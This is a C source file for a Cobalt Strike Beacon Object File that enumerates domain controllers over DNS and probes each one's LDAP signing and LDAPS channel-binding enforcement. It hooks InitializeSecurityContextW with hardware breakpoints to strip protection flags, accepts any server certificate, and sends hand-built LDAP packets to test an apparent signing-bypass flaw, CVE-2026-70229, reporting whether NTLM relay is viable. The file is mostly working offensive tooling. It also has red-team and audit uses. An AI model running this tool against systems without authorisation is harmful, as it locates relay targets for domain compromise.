#include "bofdefs.h"
#include "base.c"

static wchar_t g_fakeSpnW[64] = L"LDAP/relay.informer";

#include "hwbp.c"

VERIFYSERVERCERT ServerCertCallback;
BOOLEAN _cdecl ServerCertCallback (PLDAP Connection, PCCERT_CONTEXT pServerCert)
{
	return TRUE;
}

// Forward declare to use inside SRV enumeration before actual definition appears below
static void CheckProtection(char* host);

// Minimal DNS SRV lookup using dnsapi.dll dynamically. We rely on types from windns.h via bofdefs.h includes.
typedef unsigned long (WINAPI *DnsQuery_A_t)(const char* name, unsigned short wType, unsigned long options, void* extra, PDNS_RECORDA* results, void** reserved);
typedef void (WINAPI *DnsRecordListFree_t)(PDNS_RECORDA pRecordList, int FreeType);

static void str_copy(char* dst, unsigned int dstSize, const char* src) {
    if (!dst || !src || dstSize == 0) return;
    unsigned int i = 0; for (; i + 1 < dstSize && src[i]; ++i) dst[i] = src[i]; dst[i] = '\0';
}

static void build_query(char* out, unsigned int outSize, const char* domain) {
    const char* prefix = "_ldap._tcp.dc._msdcs.";
    if (!out || outSize == 0) return;
    out[0] = '\0';
    unsigned int i = 0; for (; i + 1 < outSize && prefix[i]; ++i) out[i] = prefix[i];
    unsigned int j = 0; for (; i + 1 < outSize && domain && domain[j]; ++i, ++j) out[i] = domain[j];
    out[i] = '\0';
}

static void CheckAllDomainControllers(void) {
    char domain[256]; domain[0] = '\0';
    // GetComputerNameExA(ComputerNameDnsDomain = 2)
    DWORD sz = (DWORD)sizeof(domain);
    if (!KERNEL32$GetComputerNameExA((COMPUTER_NAME_FORMAT)2, domain, &sz)) domain[0] = '\0';
    if (!domain[0]) {
#ifndef BOF
        internal_printf("[LDAP] Could not determine DNS domain; aborting 'all' enumeration.\n");
#endif
        return;
    }

    char query[512]; build_query(query, sizeof(query), domain);

    PDNS_RECORDA recs = NULL;
    unsigned long status = DNSAPI$DnsQuery_A(query, 33 /*DNS_TYPE_SRV*/, 0, NULL, &recs, NULL);
    if (status != 0 || !recs) {
#ifndef BOF
        internal_printf("[LDAP] DnsQuery_A failed for %s (status=0x%08lX)\n", query, status);
#endif
        return;
    }

#ifndef BOF
    internal_printf("[LDAP] Enumerating DCs via %s\n", query);
#endif

    unsigned int srvCount = 0;
    for (PDNS_RECORDA c = recs; c; c = c->pNext) { if (c->wType == 33 /*DNS_TYPE_SRV*/) ++srvCount; }
    internal_printf("[*] Found %u DCs for %s\n", srvCount, domain);

    for (PDNS_RECORDA r = recs; r; r = r->pNext) {
        if (r->wType != 33 /*DNS_TYPE_SRV*/) continue;
        char* tgt = r->Data.SRV.pNameTarget;
        if (!tgt || !tgt[0]) continue;
        char hostBuf[260]; str_copy(hostBuf, sizeof(hostBuf), tgt);
        internal_printf("\n");
        CheckProtection(hostBuf);
    }

    DNSAPI$DnsRecordListFree(recs, DnsFreeRecordList);
}

static ULONG trigger_ldap_auth(char* host, BOOL ldaps) {
#ifndef BOF
    internal_printf("[DBG] Target: %s://%s\n", ldaps?"ldaps":"ldap", host);
#endif

    LDAP* pLdapConnection = NULL;

    ULONG result;
    int portNumber = ldaps == TRUE ? 636 : 389;

    pLdapConnection = WLDAP32$ldap_init(host, portNumber);

    if(ldaps == TRUE){

        ULONG version = LDAP_VERSION3;
        result = WLDAP32$ldap_set_optionW(pLdapConnection, LDAP_OPT_VERSION, (void*)&version);

        WLDAP32$ldap_get_optionW(pLdapConnection, LDAP_OPT_SSL, &result);  //LDAP_OPT_SSL
        if (result == 0){
            WLDAP32$ldap_set_optionW(pLdapConnection, LDAP_OPT_SSL, LDAP_OPT_ON);
        }

        WLDAP32$ldap_get_optionW(pLdapConnection, LDAP_OPT_SIGN, &result);  //LDAP_OPT_SIGN
        if (result == 0){
            WLDAP32$ldap_set_optionW(pLdapConnection, LDAP_OPT_SIGN, LDAP_OPT_ON);
        }

        WLDAP32$ldap_get_optionW(pLdapConnection, LDAP_OPT_ENCRYPT, &result);  //LDAP_OPT_ENCRYPT
        if (result == 0){
            WLDAP32$ldap_set_optionW(pLdapConnection, LDAP_OPT_ENCRYPT, LDAP_OPT_ON);
        }

        WLDAP32$ldap_set_optionW(pLdapConnection, LDAP_OPT_SERVER_CERTIFICATE, (void*)&ServerCertCallback ); //LDAP_OPT_SERVER_CERTIFICATE
    }

    if (pLdapConnection == NULL)
    {
        internal_printf("Failed to establish LDAP connection on %d.", portNumber);
        return -1;
    }

    ULONG lRtn = 0;
    lRtn = WLDAP32$ldap_bind_s(pLdapConnection, "", NULL, LDAP_AUTH_NTLM);

    if(lRtn != LDAP_SUCCESS)
    {
        WLDAP32$ldap_unbind(pLdapConnection);
        pLdapConnection = NULL; 
        return lRtn;
    }

    return lRtn;
}

// ─── LDAP Signing Bypass Probe (Oct-2026 switcheroo) ────────────────────────
#define BP_UNPATCHED     0
#define BP_PATCHED       1
#define BP_DNS_FAIL      2
#define BP_CONNECT_FAIL  3
#define BP_INCONCLUSIVE  4

static int bp_ber_lbytes(int n) {
    if (n < 0x80) return 1;
    int c = 1, v = n; while (v >>= 8) c++; return c + 1;
}

static unsigned char* bp_tlv(unsigned char tag, const unsigned char *val, int vlen, int *outlen) {
    int lb = bp_ber_lbytes(vlen);
    *outlen = 1 + lb + vlen;
    unsigned char *b = (unsigned char*)MSVCRT$malloc(*outlen);
    if (!b) return NULL;
    b[0] = tag;
    if (vlen < 0x80) { b[1] = (unsigned char)vlen; }
    else {
        int nb = 0, v = vlen; unsigned char tmp[4];
        while (v) { tmp[nb++] = (unsigned char)(v & 0xFF); v >>= 8; }
        b[1] = (unsigned char)(0x80 | nb);
        for (int i = 0; i < nb; i++) b[2+i] = tmp[nb-1-i];
    }
    if (vlen > 0 && val) MSVCRT$memcpy(b + 1 + lb, val, vlen);
    return b;
}

static unsigned char* bp_enc_int(int n, int *outlen) {
    unsigned char body[5]; int blen = 0;
    if (n == 0) { body[0] = 0; blen = 1; }
    else {
        unsigned int v = (unsigned int)n;
        while (v) { body[blen++] = (unsigned char)(v & 0xFF); v >>= 8; }
        for (int i=0, j=blen-1; i<j; i++,j--) { unsigned char t=body[i]; body[i]=body[j]; body[j]=t; }
        if (body[0] & 0x80) { MSVCRT$memmove(body+1, body, blen); body[0]=0; blen++; }
    }
    return bp_tlv(0x02, body, blen, outlen);
}

static unsigned char* bp_enc_octet(const char *s, int *outlen) {
    return bp_tlv(0x04, (const unsigned char*)s, (int)MSVCRT$strlen(s), outlen);
}

static unsigned char* bp_ldap_msg(int msgid, const unsigned char *op, int oplen, int *outlen) {
    int il; unsigned char *ibuf = bp_enc_int(msgid, &il);
    int inner_len = il + oplen;
    unsigned char *inner = (unsigned char*)MSVCRT$malloc(inner_len);
    MSVCRT$memcpy(inner, ibuf, il); MSVCRT$memcpy(inner + il, op, oplen); MSVCRT$free(ibuf);
    unsigned char *msg = bp_tlv(0x30, inner, inner_len, outlen); MSVCRT$free(inner);
    return msg;
}

static unsigned char* bp_bind_req(int *outlen) {
    int vl, nl, sl;
    unsigned char *ver  = bp_enc_int(3, &vl);
    unsigned char *name = bp_enc_octet("", &nl);
    unsigned char *simp = bp_tlv(0x80, (const unsigned char*)"", 0, &sl);
    int body_len = vl + nl + sl;
    unsigned char *body = (unsigned char*)MSVCRT$malloc(body_len);
    MSVCRT$memcpy(body, ver, vl); MSVCRT$memcpy(body+vl, name, nl); MSVCRT$memcpy(body+vl+nl, simp, sl);
    MSVCRT$free(ver); MSVCRT$free(name); MSVCRT$free(simp);
    unsigned char *req = bp_tlv(0x60, body, body_len, outlen); MSVCRT$free(body);
    return req;
}

static unsigned char* bp_whoami_req(int *outlen) {
    const char *oid = "1.3.6.1.4.1.4203.1.11.3";
    int il; unsigned char *inner = bp_tlv(0x80, (const unsigned char*)oid, (int)MSVCRT$strlen(oid), &il);
    unsigned char *req = bp_tlv(0x77, inner, il, outlen); MSVCRT$free(inner);
    return req;
}

static int bp_parse(const unsigned char *buf, int len, int *bind_rc) {
    int saw2 = 0; *bind_rc = -1; int i = 0;
    while (i + 2 <= len) {
        if (buf[i] != 0x30) break; i++;
        int lb = buf[i++], mlen = 0;
        if (lb & 0x80) { int nb = lb & 0x7F; if (i + nb > len) break; while (nb--) mlen = (mlen << 8) | buf[i++]; }
        else { mlen = lb; }
        if (i + mlen > len) break;
        const unsigned char *m = buf + i; int p = 0;
        if (p+2 > mlen || m[p] != 0x02) { i += mlen; continue; } p++;
        int idlen = m[p++]; if (p + idlen > mlen) { i += mlen; continue; }
        int msgid = 0; for (int k = 0; k < idlen; k++) msgid = (msgid << 8) | m[p++];
        if (msgid == 2) saw2 = 1;
        if (msgid == 1 && p < mlen && m[p] == 0x61) {
            p++;
            int oplen = m[p++];
            if (oplen & 0x80) { int nb = oplen & 0x7F; oplen = 0; while (nb-- && p < mlen) oplen = (oplen << 8) | m[p++]; }
            if (p + 2 <= mlen && m[p] == 0x0A) { p++; int rclen = m[p++]; if (p + rclen <= mlen && rclen >= 1) *bind_rc = m[p]; }
        }
        i += mlen;
    }
    return saw2;
}

static int bp_probe(const char *host) {
    WSADATA wsa; WS2_32$WSAStartup(MAKEWORD(2,2), &wsa);

    char port_str[8]; MSVCRT$sprintf(port_str, "389");
    struct addrinfo hints, *res = NULL;
    MSVCRT$memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    int gai = WS2_32$getaddrinfo(host, port_str, &hints, &res);
    if (gai != 0 || !res) {
        WS2_32$WSACleanup(); return BP_DNS_FAIL;
    }

    SOCKET sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (WS2_32$connect(sock, res->ai_addr, (int)res->ai_addrlen) != 0) {
        WS2_32$closesocket(sock); WS2_32$freeaddrinfo(res); WS2_32$WSACleanup(); return BP_CONNECT_FAIL;
    }
    WS2_32$freeaddrinfo(res);
    DWORD tv = 5000; WS2_32$setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    int op1l, m1l, op2l, m2l;
    unsigned char *op1 = bp_bind_req(&op1l);
    unsigned char *m1  = bp_ldap_msg(1, op1, op1l, &m1l); MSVCRT$free(op1);
    unsigned char *op2 = bp_whoami_req(&op2l);
    unsigned char *m2  = bp_ldap_msg(2, op2, op2l, &m2l); MSVCRT$free(op2);
    int pkt_len = m1l + m2l;
    unsigned char *pkt = (unsigned char*)MSVCRT$malloc(pkt_len);
    MSVCRT$memcpy(pkt, m1, m1l); MSVCRT$memcpy(pkt + m1l, m2, m2l);
    MSVCRT$free(m1); MSVCRT$free(m2);

    WS2_32$send(sock, (const char*)pkt, pkt_len, 0);
    MSVCRT$free(pkt);

    unsigned char *rbuf = (unsigned char*)MSVCRT$malloc(65536);
    int recv_len = 0, r;
    while (recv_len < 65536 && (r = WS2_32$recv(sock, (char*)(rbuf+recv_len), 65536-recv_len, 0)) > 0)
        recv_len += r;

    int bind_rc = -1;
    int saw2 = bp_parse(rbuf, recv_len, &bind_rc);
    MSVCRT$free(rbuf);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();

    if (saw2)      return BP_UNPATCHED;
    if (bind_rc >= 0) return BP_PATCHED;
    return BP_INCONCLUSIVE;
}

// ─── Protection check ────────────────────────────────────────────────────────

void CheckProtection(char* host) {
    // Run bypass probe first (before any WLDAP32 calls) — result printed after signing
    int bypass = bp_probe(host);

    PVOID vehIscW = NULL; void* addrIscW = NULL;
    if (!HWBP_SetOnApiEx("sspicli.dll", "InitializeSecurityContextW", 1, ISC_VEH, &vehIscW, &addrIscW, FALSE)) {
		internal_printf("Failed to set HWBP on sspicli!InitializeSecurityContextW (DR1).\n");
		return;
	}

    // ── 1. LDAP signing ──────────────────────────────────────────
    g_stripProtFlags = 1;
    ULONG noSigning = trigger_ldap_auth(host, FALSE);
    BOOL signing_req = (noSigning == LDAP_STRONG_AUTH_REQUIRED);

    if (noSigning == LDAP_STRONG_AUTH_REQUIRED) {
        internal_printf("[%s] (LDAP) Signing:     REQUIRED\n", host);
    } else if (noSigning == LDAP_SUCCESS) {
        internal_printf("[%s] (LDAP) Signing:     NOT REQUIRED\n", host);
    } else {
        internal_printf("[%s] (LDAP) Signing:     unknown (rc:%lu)\n", host, noSigning);
    }

    // ── 2. Bypass verdict (with relay context when signing enforced) ──
    if (bypass == BP_UNPATCHED) {
        if (signing_req)
            internal_printf("[%s] (LDAP) Signing Bypass: UNPATCHED   -> relay viable (signing enforced, CVE-2026-70229 unpatched)\n", host);
        else
            internal_printf("[%s] (LDAP) Signing Bypass: UNPATCHED   (CVE-2026-70229 unpatched)\n", host);
    } else if (bypass == BP_PATCHED) {
        if (signing_req)
            internal_printf("[%s] (LDAP) Signing Bypass: PATCHED     -> relay blocked (signing required, CVE-2026-70229 patched)\n", host);
        else
            internal_printf("[%s] (LDAP) Signing Bypass: PATCHED     (CVE-2026-70229 patched)\n", host);
    } else if (bypass == BP_DNS_FAIL) {
        internal_printf("[%s] (LDAP) Signing Bypass: DNS resolution failed\n", host);
    } else if (bypass == BP_CONNECT_FAIL) {
        internal_printf("[%s] (LDAP) Signing Bypass: port 389 unreachable\n", host);
    } else {
        internal_printf("[%s] (LDAP) Signing Bypass: INCONCLUSIVE — no bind response\n", host);
    }

    // ── 3. LDAPS channel binding ──────────────────────────────────
    g_stripProtFlags = 0;
    g_cbtMode = 1; g_cbtModified = 0;
    ULONG zeroCBT = trigger_ldap_auth(host, TRUE);

    if (zeroCBT == LDAP_INVALID_CREDENTIALS) {
        internal_printf("[%s] (LDAPS) ChannelBind: REQUIRED\n", host);
    } else if (zeroCBT == LDAP_SUCCESS) {
        internal_printf("[%s] (LDAPS) ChannelBind: NOT REQUIRED\n", host);
    } else {
        internal_printf("[%s] (LDAPS) ChannelBind: unknown (rc:%lu)\n", host, zeroCBT);
    }

    HWBP_Clear(1);
    HWBP_RemoveVeh(vehIscW);
    return;
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) {
    if(!bofstart()) { return; }

	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
    char* host = (char*)BeaconDataExtract(&parser, NULL);

	//ensure not null
	if (!host) {
		internal_printf("[ERR] Host is null\n");
		return;
	}

	if (MSVCRT$_strnicmp(host, "all", 3) == 0 && (host[3] == '\0' || host[3] == '\n')) {
		CheckAllDomainControllers();
	} else {
		CheckProtection(host);
	}

    printoutput(TRUE);
}
#else
int main() {
	//
	// Constants for testing
	//
	//char* host = "10.5.10.12";
    //char* host = "meereen.essos.local";
    char* host = "all";

	if (MSVCRT$_strnicmp(host, "all", 3) == 0 && (host[3] == '\0' || host[3] == '\n')) {
		CheckAllDomainControllers();
	} else {
		CheckProtection(host);
	}

    return 0;
}
#endif



